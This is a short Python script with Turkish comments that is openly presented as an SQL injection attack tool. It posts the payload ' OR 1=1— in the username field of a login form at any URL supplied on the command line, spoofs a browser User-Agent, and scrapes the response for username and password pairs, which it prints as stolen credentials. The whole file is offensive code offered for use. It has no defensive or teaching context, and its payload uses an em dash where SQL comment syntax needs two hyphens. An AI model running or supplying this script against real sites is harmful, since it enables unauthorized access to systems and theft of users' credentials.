import requests
import re
import random
import string
import sys

# Hedef web sitesinin URL'sini belirle
if len(sys.argv) != 2:
    print("Usage: python3 Sqlinjection.py <target_url>")
    sys.exit(1)

target_url = sys.argv[1]

# SQL INJECTION saldırısı için kullanılacak karakter dizisi
sql_injection = "' OR 1=1—"

# Rıdvan Kaya tarafından oluşturulan rastgele bir kullanıcı adı ve şifre
username = "".join(random.choice(string.ascii_letters) for i in range(10))
password = "".join(random.choice(string.ascii_letters + string.digits) for i in range(10))

# POST isteği için veri sözlüğü
data = {"username": username + sql_injection, "password": password}

# Tarayıcıyı taklit eden bir User-Agent başlığı
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

try:
    # Hedef web sitesine POST isteği gönder ve yanıtı al
    response = requests.post(target_url, data=data, headers=headers)

    # Yanıtın içeriğini çözümle
    content = response.content.decode()

    # Yanıtın içeriğinde kullanıcı bilgilerini ara
    user_info = re.findall(r"Username: (.*)<br>Password: (.*)<br>", content)

    # Eğer kullanıcı bilgileri bulunursa, ekrana yazdır
    if user_info:
        print("SQL INJECTION saldırısı başarılı!")
        print("Çalınan kullanıcı bilgileri:")
        for user in user_info:
            print(f"Kullanıcı adı: {user[0]}")
            print(f"Şifre: {user[1]}")
    else:
        print("SQL INJECTION saldırısı başarısız!")

except requests.exceptions.RequestException as e:
    print(f"Bağlantı hatası: {e}")
